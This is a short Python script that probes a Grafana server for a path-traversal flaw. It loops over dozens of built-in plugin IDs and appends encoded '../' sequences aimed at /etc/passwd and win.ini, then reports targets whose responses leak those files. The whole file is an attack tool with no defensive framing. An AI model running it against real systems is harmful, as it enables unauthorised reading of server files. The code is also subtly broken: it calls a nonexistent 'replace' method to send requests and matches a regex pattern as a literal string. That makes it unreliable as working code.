import urllib3,sys
urllib=urllib3.PoolManager(timeout=1)
def req(urlreq,url):
    id_list=["alertGroups","alertlist","alertmanager","annolist","barchart","bargauge","canvas","cloudwatch","dashboard","dashlist","debug","elasticsearch","gauge","geomap","gettingstarted","grafana","grafana-azure-monitor-datasource","grafana-clock-panel","grafana-simple-json-datasource","graph","graphite","heatmap","histogram","icon","influxdb","jaeger","live","logs","loki","mixed","mssql","mysql","news","nodeGraph","opentsdb","piechart","pluginlist","postgres","prometheus","stackdriver","stat","state-timeline","status-history","table","table-old","tempo","testdata","text","timeseries","welcome","xychart","zipkin"]
    path_list=["/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd","/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini","/#/../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd","/#/../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fc:/windows/win.ini"]
    for path in path_list:
        for id in id_list:
            url_ok=url+'/public/plugins/'+id+path
            r=urlreq.replace('GET',url_ok)
            content = r.data.decode('UTF-8')
            if "for 16-bit app support" in content:
                print('tager:'+url_ok+"\n"+"url: "+url)
            elif "root:.*:0:0" in content:
                print('tager:' + url_ok + "\n" + "url: " + url)
try:
    if sys.argv[1]:
        req(urllib,sys.argv[1])
except Exception as e:print(e)
